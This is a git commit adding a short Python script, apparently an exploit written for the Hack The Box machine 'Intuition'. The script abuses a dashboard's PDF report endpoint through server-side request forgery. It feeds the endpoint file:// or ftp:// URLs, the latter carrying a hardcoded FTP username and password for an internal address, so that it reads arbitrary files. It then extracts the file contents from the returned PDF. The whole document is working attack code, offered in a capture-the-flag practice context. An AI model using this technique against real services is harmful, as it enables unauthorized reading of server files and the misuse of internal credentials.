d06ecc41d40fd4d33934a5e40f928bde0892332a
Crow <74257119+InfoSec-Crow@users.noreply.github.com>
2025-05-07 01:37:20 +0200

    Create file_read.py

---
+++ Intuition/file_read.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python3
+import requests, os, sys
+
+cookie = ''
+
+def create_pdf_report():
+    cookies = {
+        'user_data': cookie,
+    }
+    headers = {
+
+    'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    #data = f'report_url= file://{sys.argv[1]}'
+    data = f'report_url= ftp://ftp_admin:u3jai8y71s2@172.21.0.1/{sys.argv[1]}'
+    r = requests.post('http://dashboard.comprezzor.htb/create_pdf_report', cookies=cookies, headers=headers, data=data, verify=False,)
+    with open('report.pdf', 'wb') as f:
+        f.write(r.content)
+
+def print_pdf():
+    print(os.popen('pdftotext report.pdf -').read().strip())
+    os.system('rm report.pdf')
+
+create_pdf_report()
+print_pdf()
